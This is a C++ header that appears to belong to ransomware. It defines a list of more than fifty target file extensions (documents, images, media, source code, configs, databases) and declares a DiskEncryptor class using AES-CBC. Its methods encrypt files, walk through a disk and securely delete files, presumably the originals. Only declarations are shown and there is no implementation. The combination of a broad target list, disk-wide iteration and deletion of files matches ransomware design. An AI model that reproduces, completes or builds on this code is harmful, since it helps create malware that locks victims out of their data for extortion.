#include <string>

#include <cryptopp/ccm.h>
#include <cryptopp/aes.h>


#include "headers.h"


const std::string ext2Ecrypt[] = {
".zip", ".rar", ".pdf", ".img", ".jpeg", ".png", ".docx", ".xlsx",
".pptx", ".txt", ".csv", ".mp3", ".wav", ".mp4", ".avi", ".mov",
".mkv", ".jpg", ".gif", ".bmp", ".html", ".css", ".js", ".xml",
".json", ".sql", ".log", ".ini", ".cfg", ".sh", ".py", ".cpp", ".h",
".java", ".class", ".jar", ".php", ".asp", ".jsp", ".c", ".cs", ".pl",
".rb", ".psd", ".ai", ".eps", ".svg", ".tiff", ".tif", ".ipynb", ".yml", ".md",
".bin"
};

class DiskEncryptor
{

private:

	std::string _disk;
	unsigned long _freespace;
	unsigned _numberOfFiles;
	CryptoPP::CBC_Mode<CryptoPP::AES>::Encryption _e;


public:

	DiskEncryptor(std::string disk, CryptoPP::SecByteBlock& key, CryptoPP::SecByteBlock& iv);
	~DiskEncryptor();

	bool setDisk(std::string disk);
	bool setFreeSpace();
	bool setEncryption(CryptoPP::SecByteBlock& key, CryptoPP::SecByteBlock& iv);

	bool fileEncrypt(std::string file);
	bool safeFileDeletation(std::string& file);
	void iterateFiles();
};